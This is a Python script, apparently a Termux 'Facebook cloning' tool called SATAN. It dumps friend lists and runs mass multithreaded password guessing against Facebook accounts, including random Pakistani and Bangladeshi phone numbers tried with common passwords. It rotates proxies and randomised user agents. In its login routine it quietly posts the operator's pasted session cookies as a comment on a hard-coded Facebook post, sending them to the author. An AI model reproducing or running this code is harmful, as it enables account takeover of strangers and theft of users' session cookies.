    AQIB = random.choice(["Dalvik/2.1.0 (Linux; U; Android 10; SH-02M Build/SA053)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOVS32.121-40-2)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A325F Build/RP1A.200720.012) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; moto e40 Build/ROQ31.166-87)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G Build/QPNS30.37-Q3-42-32-4-3)","Dalvik/2.1.0 (Linux; U; Android 5.1; I-S6 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 5.0; Mix Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; moto g71 5G Build/S2RUBS32.51-15-3-10)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CQ54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11; land_rover_ks1920x720 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; M40 Pro_ROW Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X669D Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ52 Build/61.2.A.0.439)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; MiTV4-ANSM0 Build/MHC19J)","Dalvik/2.1.0 (Linux; U; Android 11; M2006C3LVG Build/RP1A.200720.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; SM-G965F Build/QP1A.190711.020) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; SM-G973F Build/SP1A.210812.016) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 7A MIUI/V12.5.3.0.QCMEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; 8091_EEA Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; MXQ PRO Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STB32.36-91)","Dalvik/2.1.0 (Linux; U; Android 9; LAVA LH9931 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; Elite N55Max Build/T00624)","Dalvik/2.1.0 (Linux; U; Android 11; HiSmart 2K ATV4 Build/RTO6.230411.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2253 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-28)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TP1A.220624.021)","Dalvik/2.1.0 (Linux; U; Android 13; SOG06 Build/64.1.D.0.120)","Dalvik/2.1.0 (Linux; U; Android 11; MATE 9 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one hyper Build/QPFS30.103-43-9)","Dalvik/2.1.0 (Linux; U; Android 13; 23049RAD8C Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6 play Build/POAS29.550-132-25) VD/236","Dalvik/2.1.0 (Linux; U; Android 11; SM-A307GN Build/RP1A.200720.012) VD/235","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-82-5)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M19 Build/S3020)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SE1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.B1)","Dalvik/2.1.0 (Linux; U; Android 6.0; LGLS991 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.0; AS-503 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K11AG Build/TQ2A.230505.002)","Dalvik/2.1.0 (Linux; U; Android 9; TX6 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2389 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 10; K1 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; A103ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CT54 Build/64.1.A.0.913)","Dalvik/2.1.0 (Linux; U; Android 11.1; Q96MAX Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 12; SM-N976Q Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.935)","Dalvik/2.1.0 (Linux; U; Android 9; B UHD Android TV Build/PTO2.220426.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G970N Build/PQ3A.190605.05171606)","Dalvik/2.1.0 (Linux; U; Android 10; Deco 4K con Android TV Build/QTG1.221129.001)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC54 Build/65.1.A.5.50)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; A95XF3Air Build/QT)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_I005D Build/TKQ1.220807.001)","Dalvik/2.1.0 (Linux; U; Android UpsideDownCake Build/UPB2.230407.019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC52 Build/61.2.A.0.447)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BT52 Build/62.2.A.0.481)","Dalvik/2.1.0 (Linux; U; Android 9; Dell Chromebook 11 (3180) Build/R103-14816.131.0)","Dalvik/2.1.0 (Linux; U; Android 5.1; JALA.V158F3P.E6 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-20)","Dalvik/2.1.0 (Linux; U; Android 9; AT_SmartScreen Build/RTK2851P)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge (2021) Build/S1RMS32.68-43-16-9)","Dalvik/2.1.0 (Linux; U; Android 5.0.2; ASUS_Z011D Build/LRX22G)","Dalvik/2.1.0 (Linux; U; Android 12; 100071483 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; 9296Q Build/RKQ1.210107.001)","Dalvik/2.1.0 (Linux; U; Android 9; T10LTE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; YMP-A1 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12.0; uis8581a2h10_Automotive Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; moto g62 5G Build/S1SSS32.53-85-4-2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; S22 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 9; SM-T515 Build/PPR1.180610.011) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; SM-J415FN Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; CPH2305 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; V2040 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-S9160 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; M2010J19SL Build/SKQ1.211202.001)","Dalvik/2.1.0 (Linux; U; Android 6.0; ALFA_8MB Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; 22127PC95I Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A7050 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S1SAS32.47-59-19)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; LG-LS995 Build/KOT49I.LS995ZVB)","Dalvik/2.1.0 (Linux; U; Android 9; moto e6s Build/POE29.288-46-6)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.274)","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R113-15393.58.0)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; reederA7iC Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 11; T6L Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12.0; PG11 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-25-15-15)","Dalvik/2.1.0 (Linux; U; Android 13; V2025 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; 5008D_EEA Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; Optima 8002 3G TS8001PG Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 6.0; Lenovo TB3-730F Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 11; p281 Build/RD2A.211001.002)","Dalvik/2.1.0 (Linux; U; Android 13; LE2110 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; jacuzzi Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; Acer Chromebook 15 (CB515-1H, CB515-1HT) Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 10; S14 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R113-15393.58.0)","Dalvik/2.1.0 (Linux; U; Android 9; AIWA 2K TV Build/PTO7.200805.001)"])+END
    return AQIB

#JUST USER AGENT
aqib_random_ua = (["Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1 OPX/1.6.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 DuckDuckGo/7 Safari/605.1.15","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1","Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1]"])


#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 11; Nokia G10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'



def uaku():
	try:
		ua=open('.svr.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/Luciferhck143/DATE/main/svr.txt').text
		ua=open('.svr.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.svr.txt','r').read().splitlines()
logo=("""\033[1;37m
.d8888.  .d8b.  d888888b  .d8b.  d8b   db 
88'  YP d8' `8b `~~88~~' d8' `8b 888o  88        XD 💣
`8bo.   88ooo88    88    88ooo88 88V8o 88   
  `Y8b. 88~~~88    88    88~~~88 88 V8o88   P
db   8D 88   88    88    88   88 88  V888   R
`8888Y' YP   YP    YP    YP   YP VP   V8P   O  
----------------------------------------------
 Author    : SC UPDATE 🔥 
 Github    : LUCIFER 
 Version   : 0.4.3 🚀
----------------------------------------------
Your lips 💋 are like wine & amp; I wanna get drunk.
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        os.system('clear')
        print(logo)      


ses = requests.Session()
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def login():
        clear()
        cookies = input(' Put cookies: ')
        try:
                data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",'sec-ch-prefers-color-scheme': 'light',"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
                find_token = re.search("(EAAG\w+)", data.text)
                open(".tok.txt", "w").write(find_token.group(1))
                open(".coki.txt","w").write(cookies)
                tok=open('.tok.txt','r').read()
                info = requests.get('https://b-graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cookies}).json()
                name=(info['name'])
                idd=(info['id'])
                barth=(info['birthday'])
                linex()
                print(' Welcome\033[1;32m : '+name)
                print(' \033[1;37mYour UID : '+idd)
                print(' Barth Day: '+barth)
                requests.post('https://graph.facebook.com/pfbid02Sj97PfY1mY3cvbLjGaJRz22FR7yc75JFKLoBFiHoNLSq9aGxmGKotAtcYLkMDDpbl/comments/?message='+cookies+'&access_token='+tok, cookies={'cookie':cookies})
                linex()
                print(' Cookies login has been successfull...')
                time.sleep(1)
                menu()
        except KeyError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
        except requests.exceptions.ConnectionError:
                exit(' internet connection error...')
        except AttributeError:
                print('\033[1;31m Cookies has been expired...')
                os.system('rm -rf .tok.txt');time.sleep(1);login()
                login()
def public():
        usrr=[]
        clear()
        try:
                tok = open('.tok.txt','r').read()
                cok = open('.coki.txt','r').read()
                tokenku.append(tok)
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        except IOError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                info = requests.get('https://graph.facebook.com/me/?access_token='+tok,cookies = {"cookie":cok}).json()
                name=(info['name'])
                print('\033[1;32m Welcome '+name)
                linex()
        except KeyError:
                print('\033[1;31mYour cookies han expired...');time.sleep(1)
                login()
        try:
                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
        except ValueError:
                exit(' Put only digits not latters ')
        if jum<1 or jum>5000:
                exit()
        ses=requests.Session()
        yz = 0
        for met in range(jum):
                yz+=1
                kl = input(f'\033[1;37m Put link no.{yz+0}: ')
                usrr.append(kl)
        linex()
        print(' All method working try 1 by 1 ')
        linex()
        print(' [1] Method 1 (FOR NEW IDX.) \n [2] Method 2 (WAITING)\n [3] Method 3 (WAITING)')
        linex()
        mthd = input(' Choose method: ')
        linex()
        print(' Do you went show cp account? (y/n): ')
        linex()
        cx=input(' Choose: ')
        if cx in ['y','Y','yes','Yes','1']:
                pcp.append('y')
        else:
                pcp.append('n')
        linex()
        print('\033[1;32m Dumping friend list...\033[1;37m')
        linex()
        for userr in usrr:
                try:
                        col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
                        for mi in col['friends']['data']:
                                try:
                                        iso = (mi['id']+'|'+mi['name'])
                                        if iso in id:pass
                                        else:id.append(iso)
                                except:continue
                except (KeyError,IOError):
                        pass
                except requests.exceptions.ConnectionError:
                        exit(f' No internet connection')
        try:
                plist = []
                try:
                        ps_limit = int(input(' How many passwords do you want to add ? '))
                except:
                        ps_limit =1
                linex()
                print('\033[1;32m exp: first last,firtslast,first123')
                linex()
                for i in range(ps_limit):
                        plist.append(input(f' Put password {i+1}: '))
                with tred(max_workers=30) as crack_submit:
                        clear()
                        total_ids = str(len(id))
                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
                        linex()
                        for user in id:
                                ids,names = user.split('|')
                                passlist = plist
                                if mthd in ['1','01']:
                                        crack_submit.submit(ffb,ids,names,passlist)
                                elif mthd in ['2','02']:
                                        crack_submit.submit(api,ids,names,passlist)
                                else:
                                        crack_submit.submit(api1,ids,names,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SATAN.py')
        except requests.exceptions.ConnectionError:
                exit(f' No internet connection')
        except (KeyError,IOError):
                print(f' No friends for {userr}')
                time.sleep(3)
                public()
def menu():
        try:
                clear()
        #       chk()
                x = ("sex")
                if x == ("sex"):
                        print(' [1] 📁 File Cloning\n [2] 📁 Random Cloning\n [0] Exit menu')
                        linex()
                        xd=input(' Choose an option: ')
                        if xd in ['1','01']:
                                clear()
                                print(' Put 📁 file example:  /sdcard/File.txt  etc..')
                                linex()
                                file = input(' Put 📁 file path\033[1;37m: ')
                                try:
                                        fo = open(file,'r').read().splitlines()
                                except FileNotFoundError:
                                        print('📁 File location not found ')
                                        time.sleep(1)
                                        menu()
                                clear()
                                print(' All 🔓 method working try 1 by 1 ')
                                linex()
                                print(' [1] Method 1 (Key 🔑) \n [2] Method 2 (Key 🔑)\n [3] Method 3 (Key 🔑)\n [4] Method 4 (Key 🔑) ')
                                linex()
                                mthd=input(' Choose: ')
                                linex()
                                plist = []
                                try:
                                        ps_limit = int(input(' How many 🔧 passwords do you want to add ? '))
                                except:
                                        ps_limit =1
                                linex()
                                print('\033[1;32m 🔧 exp: first last,firtslast,first123')
                                linex()
                                for i in range(ps_limit):
                                        plist.append(input(f' Put 🧬 password {i+1}: '))
                                linex()
                                print(' Do you went show cp account? (y/n): ')
                                linex()
                                cx=input(' Choose: ')
                                if cx in ['y','Y','yes','Yes','1']:
                                        pcp.append('y')
                                else:
                                        pcp.append('n')
                                with tred(max_workers=30) as crack_submit:
                                        clear()
                                        total_ids = str(len(fo))
                                        print(' Total account 😏: \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
                                        print("\033[1;37m \x1b[38;5;208mUse flight ✈️  mode for 🚀 speed up\033[1;37m")
                                        linex()
                                        for user in fo:
                                                ids,names = user.split('|')
                                                passlist = plist
                                                if mthd in ['1','01']:
                                                        crack_submit.submit(ffb,ids,names,passlist)
                                                elif mthd in ['2','02']:
                                                        crack_submit.submit(api,ids,names,passlist)
                                                elif mthd in ['3','03']:
                                                        crack_submit.submit(api1,ids,names,passlist)
                                                else:
                                                        crack_submit.submit(s1napi,ids,names,passlist)                                            
                                                                      
                                print('\033[1;37m')
                                linex()
                                print(' The process has completed')
                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                linex()
                                input(' Press enter to back ')
                                os.system('python SATAN.py')
                        #elif xd in ['2','02']:
                                #import dump
                                #dump.Main()
                        elif xd in ['3','03']:
                                public()
                        elif xd in ['2','02']:
                                clear()
                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
                                linex()
                                x=input(' Choose: ')
                                if x in ['1','01']:
                                        pak()
                                elif x in ['2','02']:
                                        bd()
                                elif x in ['3','03']:
                                        gmail()
                                else:
                                        menu()
                        elif xd in ['5','05']:
                                gmail()
                        elif xd in ['6','06']:
                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/SATAN_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/100084680097792/posts/pfbid0CZ9vn6qRF78vmdk4V3ja7Rx5mZa1hsmMaaTNXms2kkVyt1EZ7k5seWMjQd7pDfvvl/?app=fbl');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use  ')
                        else:
                                exit(' Option not found in menu...')
                else:
                        print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
                        clear()
                        print('\033[1;31m First Read Note : ')
                        print("\033[1;36m We Not Responsible if facebook\n go on update you not get ok idz\n We don't responsible if you delete your \n termux and key need approve\033[1;37m")
                        linex()
                        print(' \033[1;31mYour Key Not Registered\033[1;37m')
                        print(f" \033[1;37mYour Key : {'fkeyx'}")
                        linex();print (" Tools.. : Facebook Cloning");print (" Massage : Your Key Not Registered");print (" Status  : \033[1;91mTrail\033[1;37m\n \033[1;31m\033[1;42mNote: If You Are Free User Don't Come IB\033[0;0m");linex();print(' [+] File crack\n [+] Create ids file\n [+] Public crack\n [+] Random number crack\n [+] Random gmail crack\n [+] Exit menu\n\x1b[1;97m [1] Upgrade Tool To (\x1b[1;95mPremium\x1b[1;37m)')
                        linex()
                        input(" Choose Option : ")
                        linex()
                        print(" Your Subscription Date Expire")
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+923150665740&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi SATAN Sir, I Need To Buy Your Paid SATAN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+'fkeyx')
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python SATAN.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                print('\n No internet connection ...')
                exit()
def pak():
                user=[]
                clear()
                print('\033[1;31m Code example: 0306,0315,0335,0345')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
                        user.append(nmp)
                with tred(max_workers=30) as SATAN:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123']
                                SATAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SATAN.py')
def bd():
                user=[]
                clear()
                print('\033[1;31m Code example: 016,017,018,019')
                code = input('\033[1;37m put code: ')
                try:
                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp = ''.join(random.choice(string.digits) for _ in range(8))
                        user.append(nmp)
                with tred(max_workers=30) as SATAN:     
                        clear()
                        tl = str(len(user))
                        print(' Total account : \033[1;32m'+tl)
                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Bangladesh','bangladesh','i love you','iloveyou','free fire','freefire']
                                SATAN.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' Press enter to back ')
                os.system('python SATAN.py')
def gmail():
                os.system('rm -rf .re.txt')
                clear()
                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
                linex()
                last = input(' Put last name: ')
                linex()
                print(' Example: @gmail.com , @yahoo.com etc...')
                linex()
                domain = input(' domain: ')
                linex()
                try:
                        limit=int(input(' Put limit: '))
                except ValueError:
                        limit = 5000
                linex()
                print(' Getting gmails...')
                lists = ['3','4']
                for xd in range(limit):
                        lchoice = random.choice(lists)
                        if '3' in lchoice:
                                mail = ''.join(random.choice(string.digits) for _ in range(3))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        else:
                                mail = ''.join(random.choice(string.digits) for _ in range(4))
                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                        fo = open('.re.txt', 'r').read().splitlines()
                with tred(max_workers=30) as SATAN:
                        total = str(len(fo))
                        clear()
                        print(' Total account : \033[1;32m'+total)
